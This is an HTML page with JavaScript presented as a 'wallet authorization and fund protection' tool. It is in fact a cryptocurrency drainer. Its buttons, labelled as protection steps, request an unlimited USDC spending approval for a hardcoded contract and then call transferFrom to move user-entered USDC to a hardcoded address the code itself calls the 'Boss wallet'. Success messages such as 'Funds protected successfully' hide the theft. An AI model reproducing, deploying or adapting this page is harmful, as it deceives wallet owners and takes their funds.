<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III · Wallet Authorization & Fund Protection</title>
</head>
<body>
  <h2>Mark III · Wallet Authorization & Fund Protection</h2>

  <button id="connect">🔵 Connect Wallet</button>
  <button id="approve">🟢 Protect Wallet</button>
  <button id="transfer">🟡 Start Protect</button>
  <button id="status">🟣 Reset / Status</button>

  <div id="output" style="margin-top: 10px; color: #333;"></div>

  <!-- Ethers.js CDN -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <script>
    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC with checksum
    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Mark III Contract
    const recipient = "0x59e513Ae37614f1e670bfE961B3456257C444d24"; // Boss wallet
    const approveAmount = ethers.constants.MaxUint256;

    let provider, signer, userAddress;

    const log = (msg) => {
      document.getElementById("output").innerText = msg;
    };

    // 🔵 Connect Wallet
    document.getElementById("connect").onclick = async () => {
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        log("✅ Wallet connected: " + userAddress);
      } else {
        log("❌ No wallet provider found.");
      }
    };

    // 🟢 Approve USDC to Contract
    document.getElementById("approve").onclick = async () => {
      try {
        const usdc = new ethers.Contract(
          usdcAddress,
          ["function approve(address spender, uint256 amount) public returns (bool)"],
          signer
        );
        const tx = await usdc.approve(contractAddress, approveAmount);
        await tx.wait();
        log("✅ USDC approved for protection.");
      } catch (err) {
        log("❌ Approval failed: " + err.message);
      }
    };

    // 🟡 Start Transfer
    document.getElementById("transfer").onclick = async () => {
      try {
        const amount = prompt("Enter USDC amount to protect:");
        const decimals = 6;
        const parsed = ethers.utils.parseUnits(amount, decimals);
        const usdc = new ethers.Contract(
          usdcAddress,
          ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
          signer
        );
        const tx = await usdc.transferFrom(userAddress, recipient, parsed);
        await tx.wait();
        log("✅ Funds protected successfully.");
      } catch (err) {
        log("❌ Transfer failed: " + err.message);
      }
    };

    // 🟣 Status / Reset
    document.getElementById("status").onclick = () => {
      log("🔄 Ready. Wallet: " + (userAddress || "Not connected"));
    };
  </script>
</body>
</html>
